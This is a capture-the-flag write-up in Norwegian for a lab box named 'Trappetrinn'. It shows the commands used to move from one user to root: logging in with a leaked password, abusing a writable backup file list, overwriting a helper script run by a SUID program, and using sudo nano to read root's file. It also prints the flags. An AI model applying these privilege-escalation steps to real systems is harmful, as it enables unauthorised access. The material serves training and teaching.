# Trappetrinn

Vi har avdekket en mulig bedrift som kan være knyttet til Utlandia, og har funnet et av passordene til en av de ansatte i en offentlig tilgjengelig, lekket database.

Det er ditt oppdrag å innhente informasjon som avklarer om det foreligger en slik tilknytning eller ikke.

Passordet er `Bubbles2021`
```sh
ssh sarah@trappetrinn
```
---

## 2.7.1. Sarah

```sh
sarah@trappetrinn:~$ ls -la
... 
-rw-r--r--. 1 sarah sarah   33 Dec 21 13:55 sarah.txt
sarah@trappetrinn:~$ cat sarah.txt
b8825036c4efcff882c5af1638b53510
```

login@corax ~/2_oppdrag/2.7_Trappetrinn $ scoreboard b8825036c4efcff882c5af1638b53510

2.7.1 Trappetrinn\
Første steg fullført. Hvor mange flere kan det være?

## 2.7.2. David
Lete etter privesc for å bli david.

```sh
sarah@trappetrinn:~/.cache$ find / -writable -type f 2>/dev/null | grep -v proc
/dev/termination-log
...
/opt/projects/projectAtla/NoteFromDavid.md
```

```sh
sarah@trappetrinn:~/.cache$ cat /opt/projects/projectAtla/NoteFromDavid.md
Sarah,

I've set up a temporary backup script for important files related to the project.
It runs automatically every minute.

The script reads the path to back up from the 'filesToBackup' file in the backup folder.
If you want to back up any files, just add them to that file.
Make sure there is a newline between the file paths though, or it won't work.

It's just a simple hack until I get the proper backup runner finished.

— David
```

La til `david.txt` i listen og ventet på backup-jobben.

```sh
echo "/home/david/david.txt" >> /opt/projects/projectAtla/backup/filesToBackup
# Etter at jobben hadde kjørt
cat /opt/projects/projectAtla/backup/files/david.txt
9f63269681edb171d5fa7ea529f42068
```

login@corax ~/2_oppdrag/2.7_Trappetrinn $ scoreboard 9f63269681edb171d5fa7ea529f42068

2.7.2 Trappetrinn David\
Dette er nok ikke David fornøyd med...

## 2.7.3. Priya
Hentet SSH-nøkkelen til David via backup, logget inn og undersøkte `seniorteam`-verktøyene.

```sh
david@trappetrinn:/opt/senior-tools/programs$ ls -la /opt/senior-tools/helper-scripts/
...
-rw-rw----. 1 priya seniorteam 309 Dec 18 10:18 NoteFromPriya.md
-rwxrwx---. 1 priya seniorteam 168 Dec 21 15:29 helper.sh
```

```sh
david@trappetrinn:/opt/senior-tools/programs$ cat ../helper-scripts/NoteFromPriya.md
David,

This is a folder to put helper scripts into.
Mainly smaller scripts that perform specific functions that you can use with bigger scripts or programs.
For example, the runTask program I made, which makes use of helper.sh.
It just helps save us some time not having to recode everything.

— Priya
```

Oppdaterte `helper.sh` og kjørte `runTask` (SUID) for å hente flagget.

```sh
cat > /opt/senior-tools/helper-scripts/helper.sh << 'EOT'
#!/bin/bash -p
id
cat /home/priya/priya.txt > /tmp/priya.txt
chmod 777 /tmp/priya.txt
EOT

/opt/senior-tools/programs/runTask
uid=1001(david) gid=1001(david) euid=1002(priya) groups=1001(david),1005(projectteam),1006(seniorteam)
chmod: changing permissions of '/tmp/priya.txt': Operation not permitted
cat /tmp/priya.txt
65de46eec27561f2e246a7be000ceda6
```

login@corax ~ $ scoreboard 65de46eec27561f2e246a7be000ceda6

2.7.3 Trappetrinn Priya\
.sh filer overfører ikke SUID bit-en, men C programmer gjør det! Bra jobba!

## 2.7.4. Root
Brukte Priya sin sudo-rettighet på `nano` for å lese root-flagget.

```sh
priya@trappetrinn:/home$ sudo -l
User priya may run the following commands on trappetrinn:
    (ALL) NOPASSWD: /usr/bin/nano
priya@trappetrinn:/home$ sudo /usr/bin/nano /root/root.txt
a3b0495f1583f794f6cbd5f8b6905050
```

login@corax ~ $ scoreboard a3b0495f1583f794f6cbd5f8b6905050

2.7.4 Trappetrinn ROOT\
Du kom deg opp hele trappen jo! Bra jobba!